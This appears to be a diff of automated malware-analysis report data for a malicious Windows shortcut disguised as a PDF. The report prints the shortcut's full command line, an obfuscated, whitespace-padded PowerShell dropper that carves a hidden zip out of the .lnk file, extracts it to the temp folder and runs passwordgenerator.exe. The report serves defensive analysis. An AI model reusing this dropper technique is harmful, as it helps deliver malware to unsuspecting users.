@@ -5,7 +5,67 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [5.740459445740448, 7.9885137853848125, 7.98876893139673, 7.9894219532445, 7.989042960026988, 7.989102696133533, 7.987468867255346, 7.989736790013646, 7.989187297241773, 7.989257417735751, 7.988327602889118, 7.989718856188613, 7.986265376836744, 7.9884448259708885, 7.986084065735939, 7.989616158490826, 7.989026484833413, 7.989230931220229, 7.990173001234821, 7.988256985495144, 7.98897614707003, 7.9884893137157, 7.988385353597927, 7.988591135159322, 7.987987173786115, 7.988483151794494, 7.9902877209826695, 7.988116831278224, 7.989745658780264, 7.989719190832768, 7.988359348808167, 7.98985334612218, 7.987438611079793, 7.987675048485223, 7.988654647706952, 7.9885868539760105, 7.987177797889945, 7.985670127233998, 7.96989647650812, 7.982553508503534, 7.982553713632587, 7.982572029397331, 7.949490870697784, 7.986859407839883, 7.987447812227842, 7.986818865421804, 7.987998016426029, 7.983261964491221, 7.9829603768296336, 7.978239374710243]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              5.740459445740448,
+              7.9885137853848125,
+              7.98876893139673,
+              7.9894219532445,
+              7.989042960026988,
+              7.989102696133533,
+              7.987468867255346,
+              7.989736790013646,
+              7.989187297241773,
+              7.989257417735751,
+              7.988327602889118,
+              7.989718856188613,
+              7.986265376836744,
+              7.9884448259708885,
+              7.986084065735939,
+              7.989616158490826,
+              7.989026484833413,
+              7.989230931220229,
+              7.990173001234821,
+              7.988256985495144,
+              7.98897614707003,
+              7.9884893137157,
+              7.988385353597927,
+              7.988591135159322,
+              7.987987173786115,
+              7.988483151794494,
+              7.9902877209826695,
+              7.988116831278224,
+              7.989745658780264,
+              7.989719190832768,
+              7.988359348808167,
+              7.98985334612218,
+              7.987438611079793,
+              7.987675048485223,
+              7.988654647706952,
+              7.9885868539760105,
+              7.987177797889945,
+              7.985670127233998,
+              7.96989647650812,
+              7.982553508503534,
+              7.982553713632587,
+              7.982572029397331,
+              7.949490870697784,
+              7.986859407839883,
+              7.987447812227842,
+              7.986818865421804,
+              7.987998016426029,
+              7.983261964491221,
+              7.9829603768296336,
+              7.978239374710243
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +78,17 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"Description, CommandArgs, IconFile, Unicode, ExpString, PreferEnvPath, KeepLocalIDList\", \"file_attributes\": \"(none)\", \"target_file_size\": 117478, \"icon_index\": \"(none)\", \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"description\": \"Type: pdfDocument\", \"command_line_arguments\": \"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /c \\\"po^wersh^ell -windowstyle hidden $obf_lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 00824235} ^| Select-Object -ExpandProperty FullName;$obf_file = [system.io.file]::ReadAllBytes($obf_lnkpath);$obf_path = '%TEMP%\\\\tmp.zip';$obf_path = [Environment]::ExpandEnvironmentVariables($obf_path);$obf_dir = [System.IO.Path]::GetDirectoryName($obf_path);[System.IO.File]::WriteAllBytes($obf_path, $obf_file[008192..($obf_file.length)]);cd $obf_dir;Expand-Archive -Path $obf_path -DestinationPath . -EA SilentlyContinue -Force ^| Out-Null;Remove-Item -Path $obf_path -EA SilentlyContinue -Force ^| Out-Null;^& .\\\\passwordgenerator.exe\\\"\", \"icon_file_name\": \".\\\\DNQJXCklWmip.pdf\"}",
+        "body": {
+          "command_line_arguments": "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /c \"po^wersh^ell -windowstyle hidden $obf_lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 00824235} ^| Select-Object -ExpandProperty FullName;$obf_file = [system.io.file]::ReadAllBytes($obf_lnkpath);$obf_path = '%TEMP%\\tmp.zip';$obf_path = [Environment]::ExpandEnvironmentVariables($obf_path);$obf_dir = [System.IO.Path]::GetDirectoryName($obf_path);[System.IO.File]::WriteAllBytes($obf_path, $obf_file[008192..($obf_file.length)]);cd $obf_dir;Expand-Archive -Path $obf_path -DestinationPath . -EA SilentlyContinue -Force ^| Out-Null;Remove-Item -Path $obf_path -EA SilentlyContinue -Force ^| Out-Null;^& .\\passwordgenerator.exe\"",
+          "description": "Type: pdfDocument",
+          "file_attributes": "(none)",
+          "flags": "Description, CommandArgs, IconFile, Unicode, ExpString, PreferEnvPath, KeepLocalIDList",
+          "hot_key": "(none)",
+          "icon_file_name": ".\\DNQJXCklWmip.pdf",
+          "icon_index": "(none)",
+          "run_window": "Show Minimized No Activate",
+          "target_file_size": 117478
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -55,7 +125,10 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"target_ansi\": \"%windir%\\\\system32\\\\cmd.exe\", \"target_unicode\": \"%windir%\\\\system32\\\\cmd.exe\"}",
+        "body": {
+          "target_ansi": "%windir%\\system32\\cmd.exe",
+          "target_unicode": "%windir%\\system32\\cmd.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -83,7 +156,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"Length\": 816039}",
+        "body": {
+          "Length": 816039
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
